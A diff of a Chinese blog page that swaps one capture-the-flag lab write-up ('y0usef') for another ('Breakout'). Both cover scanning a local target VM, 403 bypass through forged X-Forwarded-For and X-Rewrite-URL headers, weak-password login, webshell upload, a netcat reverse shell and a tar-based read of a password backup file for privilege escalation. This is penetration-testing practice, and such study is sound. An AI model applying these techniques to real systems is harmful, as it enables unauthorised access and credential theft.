@@ -10,7 +10,14 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    <meta name="description" content="y0usef打靶靶机介绍1.涉及技术1.弱口令漏洞2.文件上传绕过3.Base64编码4.限制突破403打靶开始1.主机发现1234567└─$ sudo arp-scan -l[sudo] pas,"> 
+    <meta name="description" content="Breakout打靶靶机描述名字：Breakout
+使用技术：
+445端口发现用户名
+tar任意文件读取
+ook!加密解密
+服务器密码泄露
+
+攻击主机：Kali Linux 2021 IP：192.,"> 
     <meta name="author" content="yifang"> 
     <link rel="alternative" href="atom.xml" title="yifang" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -52,35 +59,39 @@
 
         </div>
         <div class="content markdown">
-            <h1 id="y0usef打靶"><a href="#y0usef打靶" class="headerlink" title="y0usef打靶"></a>y0usef打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><h3 id="1-涉及技术"><a href="#1-涉及技术" class="headerlink" title="1.涉及技术"></a>1.涉及技术</h3><h4 id="1-弱口令漏洞"><a href="#1-弱口令漏洞" class="headerlink" title="1.弱口令漏洞"></a>1.弱口令漏洞</h4><h4 id="2-文件上传绕过"><a href="#2-文件上传绕过" class="headerlink" title="2.文件上传绕过"></a>2.文件上传绕过</h4><h4 id="3-Base64编码"><a href="#3-Base64编码" class="headerlink" title="3.Base64编码"></a>3.Base64编码</h4><h4 id="4-限制突破403"><a href="#4-限制突破403" class="headerlink" title="4.限制突破403"></a>4.限制突破403</h4><h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b3:6c:8c, IPv4: 192.168.0.103</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.100	08:00:27:a3:05:e3	PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
-
-<p>目标主机IP为192.168.0.100</p>
-<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ nmap -sC -p- -sV 192.168.0.100</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-20 20:57 EST</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d8:e0:99:8c:76:f1:86:a3:ce:09:c8:19:a4:1d:c7:e1 (DSA)</span><br><span class="line">|   2048 82:b0:20:bc:04:ea:3f:c2:cf:73:c3:d4:fa:b5:4b:47 (RSA)</span><br><span class="line">|   256 03:4d:b0:70:4d:cf:5a:4a:87:c3:a5:ee:84:cc:aa:cc (ECDSA)</span><br><span class="line">|_  256 64:cd:d0:af:6e:0d:20:13:01:96:3b:8d:16:3a:d6:1b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
-
-<p>目标22，80端口打开</p>
-<h3 id="3-403强制突破"><a href="#3-403强制突破" class="headerlink" title="3.403强制突破"></a>3.403强制突破</h3><p>这里说一下，一般403是权限不足导致的，对于403页面，有的服务器会对本地允许访问，导致可以突破403访问限制</p>
-<p>一般有以下几种方式进行限制突破（4种）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Http非标准报文</span><br><span class="line">1.url覆盖</span><br><span class="line">	X-Original-URL</span><br><span class="line">	X-Rewrite-URL</span><br><span class="line">2.参数覆盖</span><br><span class="line">	referer</span><br><span class="line">3. 本地访问</span><br><span class="line">	x-forwarded-for</span><br><span class="line">	x-Remote-IP:127.0.0.1</span><br><span class="line">	X-Originating-IP:</span><br><span class="line">	host旁站</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-URL覆盖"><a href="#1-URL覆盖" class="headerlink" title="1.URL覆盖"></a>1.URL覆盖</h4><p>包头如下，参数覆盖</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">X-Rewrite-URL</span><span class="punctuation">: </span>/adminstration</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=09a1smlqv9r1gsfr7h1f39kfb0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2.Referer"></a>2.Referer</h4><p>有的页面只有通过某种特殊方式打开，使用<code>referer</code>进行尝试，实现</p>
-<h4 id="3-本地访问"><a href="#3-本地访问" class="headerlink" title="3.本地访问"></a>3.本地访问</h4><h5 id="1-XFF绕过-amp-XRI-amp-XOI"><a href="#1-XFF绕过-amp-XRI-amp-XOI" class="headerlink" title="1.XFF绕过&amp;XRI&amp;XOI"></a>1.XFF绕过&amp;XRI&amp;XOI</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/adminstration/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=09a1smlqv9r1gsfr7h1f39kfb0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-Host旁站"><a href="#2-Host旁站" class="headerlink" title="2.Host旁站"></a>2.Host旁站</h5><p>使用旁站，降低服务器警惕性，通过修改<code>Host</code>实现</p>
+            <h1 id="Breakout打靶"><a href="#Breakout打靶" class="headerlink" title="Breakout打靶"></a>Breakout打靶</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p>名字：<code>Breakout</code></p>
+<p>使用技术：</p>
+<p><code>445端口发现用户名</code></p>
+<p><code>tar任意文件读取</code></p>
+<p><code>ook!加密解密</code></p>
+<p><code>服务器密码泄露</code></p>
 <hr>
-<p>本次打靶通过<code>XFF</code>实现突破限制</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211034614.png"></p>
-<h3 id="4-漏洞发现"><a href="#4-漏洞发现" class="headerlink" title="4.漏洞发现"></a>4.漏洞发现</h3><p>使用弱口令进行登录 <code>admin&amp;admin</code>，成功访问，在登录后，进行寻找后台漏洞，发现有文件上传位置，进行上传绕过</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211035145.png"></p>
-<p>成功上传webshell！</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211029067.png"></p>
-<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>在目标主机的<code>/home</code>目录下发现了<code>user.txt</code>文件，使用cat命令打开</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211049005.png"></p>
-<p>使用ssh进行登录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111211053670.png"></p>
-<p>提权成功打靶结束</p>
+<p>攻击主机：<em>Kali Linux 2021 IP：192.168.0.103</em></p>
+<p>目标主机：<em>Debian 5.10 IP：192.168.0.105</em></p>
+<h2 id="打靶开始"><a href="#打靶开始" class="headerlink" title="打靶开始"></a>打靶开始</h2><h3 id="1-目标发现"><a href="#1-目标发现" class="headerlink" title="1.目标发现"></a>1.目标发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.103</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.105	08:00:27:0a:ce:ae	PCS Systemtechnik GmbH（目标主机）</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sC -sV -p- 192.168.0.105</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">10000/tcp open  http        MiniServ 1.981 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.981</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">20000/tcp open  http        MiniServ 1.830 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.830</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>打开了80，139，445，10000，20000端口</p>
+<h3 id="3-目标提示信息"><a href="#3-目标提示信息" class="headerlink" title="3.目标提示信息"></a>3.目标提示信息</h3><p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061711782.png" alt="arp"></p>
+<p>奇奇怪怪的加密文件，百度大法后，得知是<code>ook!</code>加密</p>
+<p>获得了一串字符，猜测是操作系统密码，那账户呢？</p>
+<p>目标打开的445端口samba服务，使用工具进行扫描<code>enum4linux</code>结果发现目标系统有一个账户 <code>cyber</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061720472.png" alt="enum4linux"></p>
+<h3 id="4-成功登录并反弹shell"><a href="#4-成功登录并反弹shell" class="headerlink" title="4.成功登录并反弹shell"></a>4.成功登录并反弹shell</h3><p>目标开了20000端口，并启动了<code>Usermin</code>来管理服务器，使用账户密码登录 <code>cyber/(来点挑战性就不公布密码了)</code></p>
+<p>成功登录！！！</p>
+<p>寻找命令行管理工具 反弹shell，nc接收shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061730415.jpg" alt="enum4linux"></p>
+<p>nc接受到shell </p>
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>发现隐藏文件 <code>.old_pass.bak</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061733296.jpg" alt="enum4linux"></p>
+<p>以及主目录下的tar文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061734943.jpg" alt="enum4linux"></p>
+<p>发现tar文件可以进行任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./tar -cf 1.tar /var/backups/.old_pass.bak</span><br><span class="line">tar xf 1.tar</span><br><span class="line">cd var/backups/</span><br><span class="line">cat .old_pass.bak</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201061743184.jpg" alt="enum4linux"></p>
+<p>打靶结束！！！</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
